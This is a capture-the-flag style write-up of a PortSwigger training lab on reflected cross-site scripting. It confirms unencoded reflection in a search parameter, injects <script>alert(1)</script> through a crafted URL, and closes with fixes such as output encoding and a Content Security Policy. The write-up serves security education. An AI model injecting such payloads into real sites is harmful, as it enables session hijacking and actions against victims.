# PortSwigger — Reflected XSS into HTML Context with Nothing Encoded

`Web Security Academy` • `Cross-Site Scripting` • `Apprentice`

## TL;DR

The search functionality reflects user input directly into the HTML response without any sanitisation or encoding. Injecting a `<script>` tag into the search parameter causes the browser to execute arbitrary JavaScript, triggering an `alert()` call and solving the lab.

**Lab URL:** `https://0adc00f304ff3911802f033600a300e5.web-security-academy.net/`

---

## Challenge Description

> This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
>
> To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

**Context:**
- Difficulty: **Apprentice**
- Category: **Cross-Site Scripting — Reflected**
- Goal: Inject a payload into the search bar that triggers `alert(1)` in the browser

---

## Recon

### Step 1 — Identify the injection point

The application exposes a search form at the root of the site. Submitting a search term reflects it back in the page response:

```
https://<lab-id>.web-security-academy.net/?search=test
```

The response body contains:

```html
<h1>0 search results for 'test'</h1>
```

The input is reflected **raw** inside the HTML — no HTML entity encoding, no sanitisation, no Content Security Policy.

### Step 2 — Confirm the injection is unfiltered

Submitting a simple HTML tag:

```
?search=<b>hello</b>
```

Returns:

```html
<h1>0 search results for '<b>hello</b>'</h1>
```

The tag is rendered by the browser — **HTML injection confirmed** ✅

---

## Exploitation

### Step 3 — Inject a script tag

Since the input is reflected verbatim into the HTML context, a standard `<script>` tag executes immediately when the browser parses the response:

```
?search=<script>alert(1)</script>
```

The server generates:

```html
<h1>0 search results for '<script>alert(1)</script>'</h1>
```

The browser parses the `<script>` tag as valid JavaScript, executes `alert(1)`, and the dialog box appears.

### Step 4 — Deliver the payload

Entering the payload directly in the search bar:

```
<script>alert(1)</script>
```

Or navigating directly to the crafted URL:

```
https://0adc00f304ff3911802f033600a300e5.web-security-academy.net/?search=<script>alert(1)</script>
```

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
/?search=test   →   'test' reflected raw in HTML   →   injection point confirmed
        ↓
/?search=<b>hello</b>   →   tag rendered   →   no sanitisation confirmed
        ↓
/?search=<script>alert(1)</script>
→ server reflects payload verbatim into HTML response
→ browser parses <script> tag and executes alert(1)
        ↓
Alert dialog fires → LAB SOLVED ✅
```

---

## Key Takeaways

- **Reflected XSS** occurs when user-supplied input is echoed back in the HTTP response without sanitisation — the payload is not stored, it only executes for the victim who clicks the crafted link
- **HTML context injection** is the simplest XSS variant — no attribute escaping or JavaScript context breakout is needed, a bare `<script>` tag suffices
- In a real attack scenario, `alert(1)` would be replaced by a payload that **steals session cookies**, redirects to a phishing page, or performs actions on behalf of the victim
- The fix is straightforward: HTML-encode all user-controlled output (`<` → `&lt;`, `>` → `&gt;`) and implement a strict **Content Security Policy** to block inline scripts

---

## References

- [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)